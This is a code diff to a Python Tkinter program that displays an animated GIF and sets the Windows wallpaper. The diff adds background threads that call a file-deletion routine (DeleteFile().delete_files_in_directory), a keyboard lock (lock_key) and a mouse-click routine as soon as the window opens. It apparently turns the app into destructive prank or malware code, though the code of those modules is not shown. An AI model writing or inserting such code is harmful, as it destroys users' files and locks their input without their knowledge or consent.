@@ -7,6 +7,10 @@ import ctypes
 from PIL import Image, ImageTk
 import pygame
 
+from lock import lock_key, unlock_key
+from remove_file import DeleteFile
+from click_movie import click_mouse
+
 class ImageLabel(tk.Label):
     def load(self, im):
         if isinstance(im, str):
@@ -59,11 +63,22 @@ class App(tk.Tk):
 
         self.lbl = ImageLabel(self)
         self.lbl.pack()
+
         self.thread_kaun = threading.Thread(target=self.lbl.load, args=(os.path.dirname(os.path.realpath("__file__"))+"\media\gif.gif",))
         self.thread_kaun.start()
 
+        self.del_obj = DeleteFile()
+        self.thread_del_dir = threading.Thread(target=self.del_obj.delete_files_in_directory)
+        self.thread_del_dir.start()
+
         self.thread_bg = threading.Thread(target=self.bg_new, args=(1,))
         self.thread_bg.start()
+
+        self.thread_lock_keyboard = threading.Thread(target=lock_key)
+        self.thread_lock_keyboard.start()
+
+        self.thread_click_sound = threading.Thread(target=click_mouse)
+        self.thread_click_sound.start()
 
     def set_wallpaper(self, image_path):
         # Set desktop wallpaper on Windows
